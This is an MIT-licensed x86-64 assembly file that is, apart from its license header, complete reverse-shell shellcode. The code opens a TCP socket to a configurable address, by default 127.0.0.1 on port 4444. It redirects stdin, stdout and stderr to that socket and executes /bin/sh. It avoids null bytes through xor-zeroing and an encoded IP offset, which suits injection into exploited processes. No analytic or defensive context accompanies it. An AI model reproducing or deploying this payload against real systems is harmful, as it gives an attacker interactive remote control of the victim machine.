/*
Copyright (c) 2022 TheOddZer0

Permission is hereby granted, free of charge, to any person obtaining a copy of
this software and associated documentation files (the "Software"), to deal in
the Software without restriction, including without limitation the rights to
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
of the Software, and to permit persons to whom the Software is furnished to do
so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
.global _start
#ifndef	IP_ADDRESS
#define	IP_ADDRESS	0x02010180
#endif
#ifndef	IP_OFFSET
#define	IP_OFFSET	0x01010101
#endif
#ifndef	PORT
#define	PORT		0x5c11
#endif

#define	SYS_SOCKET	0x29
#define	SYS_CONNECT	0x2A
#define	SYS_DUP2	0x21
#define	SYS_EXECVE	0x3B
#define SHELL		0x68732f2f6e69622f

.code64

.section .text
    .type _start, @function
	_start:
		xorq	%rdi,%rdi
		movl	$IP_ADDRESS,%esi
		subl	$IP_OFFSET,%esi
		pushq	%rsi
		pushw	$PORT
		pushw	$0x2
		xorq	%rdi,%rdi
		xorq	%rsi,%rsi
		xorq	%rax,%rax
		movb    $SYS_SOCKET,%al
		movw	$0x2,%di
		movw	$0x1,%si
		syscall 
		movq	%rax,%rdi
		xorq	%rax,%rax
		movb	$SYS_CONNECT,%al
		movq	%rsp,%rsi
		movl	$0x10,%edx
		syscall
		xorq	%rsi,%rsi
		.Lstd:
			movb	$SYS_DUP2,%al
			syscall 
			incq	%rsi
			cmpq	$0x2,%rsi
			jle	    .Lstd
		xorq	%rax,%rax
		xorq	%rsi,%rsi
		xorq	%rdx,%rdx
		pushq	%rax
		movabs	$SHELL,%rdi
		pushq	%rdi
		movq	%rsp,%rdi
		movb	$SYS_EXECVE,%al
		syscall
 
